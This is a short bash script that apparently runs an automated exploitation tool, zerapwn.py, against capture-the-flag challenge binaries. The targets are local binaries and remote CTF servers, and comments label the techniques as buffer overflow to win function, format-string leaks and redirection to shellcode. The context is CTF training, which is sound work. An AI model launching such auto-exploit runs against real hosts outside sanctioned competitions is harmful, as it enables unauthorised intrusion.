#!/bin/bash
#Buffer Overflows with win functions
zerapwn.py challenges/ret -u ctf.hackucf.org -p 9003
zerapwn.py challenges/bof3 -u ctf.hackucf.org -p 9002
zerapwn.py challenges/bof2 -u ctf.hackucf.org -p 9001
zerapwn.py challenges/bof1 -u ctf.hackucf.org -p 9000
#Down for the summer
#zerapwn.py challenges/easy_format -u tctf.competitivecyber.club -p 7801
#zerapwn.py challenges/medium_format -u tctf.competitivecyber.club -p 7802

#Format string leak
zerapwn.py challenges/easy_format
#Format string point to win function
zerapwn.py challenges/medium_format
#Format string point to shellcode
#Sometimes r2 debug doesn't give us matching shellcode
#locations to our normal running environment. and sometimes
#running it twice makes it work
zerapwn.py challenges/hard_format 

#Buffer overflow point to shellcode
zerapwn.py challenges/demo_bin
